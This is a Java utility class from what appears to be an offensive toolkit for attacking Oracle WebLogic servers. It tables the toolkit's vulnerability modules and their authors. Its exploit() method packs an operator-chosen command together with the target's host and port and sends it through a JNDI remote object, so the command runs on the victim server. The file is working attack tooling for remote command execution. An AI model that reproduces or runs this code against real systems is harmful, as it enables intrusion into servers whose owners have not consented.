/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.utils;

import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.vuls.VulTest;
import java.net.URL;
import java.util.*;
import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.weblogic.framework.utils.CallUtils.callExec;
import static com.weblogic.framework.utils.UrlUtils.checkUrl;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: VulUtils
 * Desc: 漏洞工具类
 * Date:2020/4/2 21:02
 * @version 1.0.0
 */
public class VulUtils {

    /**
     * 私有化构造防止被实例化
     */
    private VulUtils(){}

    public static List<String[]> getVulList(){
        final List<Class<? extends VulTest>> vulClasses =
                new ArrayList<Class<? extends VulTest>>(VulTest.Utils.getVulTest());
        Collections.sort(vulClasses, new StringUtils.ToStringComparator());
        final List<String[]> rows = new LinkedList<String[]>();
        for (Class<? extends VulTest> payloadClass : vulClasses) {
            rows.add(new String[] {
                    payloadClass.getSimpleName().replace("_","-"),
                    StringUtils.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
//                    StringUtils.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)),", ", "", ""),
//                    StringUtils.join(Arrays.asList(Versions.Utils.getVersionsSimple(payloadClass)),", ", "", "")
            });
        }
        return rows;
    }

    /**
     * 获取漏洞信息
     * @return
     */
    public static String getVulInfo(){
        List<String[]> rows = getVulList();
        rows.add(0,new String[] {"Vul", "Authors"});
        TablePrintUtil printUtil = TablePrintUtil.build(rows).setAlign(TablePrintUtil.ALIGN_LEFT).setEquilong(true);
        return printUtil.getTableString();
    }

    /**
     * EXP
     * @param url url
     * @param remote jndi 对象
     * @param param 执行命令
     * @return 执行结果
     */
    public static String exploit(String url, Object remote, String... param) throws Exception {
        String cmd = param[0];
        String charsetName = defaultCharsetName;
        if(isBlank(cmd)){
            throw new MyException("请输入执行命令");
        }
        if(param.length > 1){
            if(!isBlank(param[1])){
                charsetName = param[1];
            }
        }
        URL targetURL = new URL(url);
        int port = targetURL.getPort() == -1 ? targetURL.getDefaultPort() : targetURL.getPort();
        cmd += "@@"+charsetName+"####"+targetURL.getHost()+":"+port;
        return callExec(cmd,remote);
    }
}
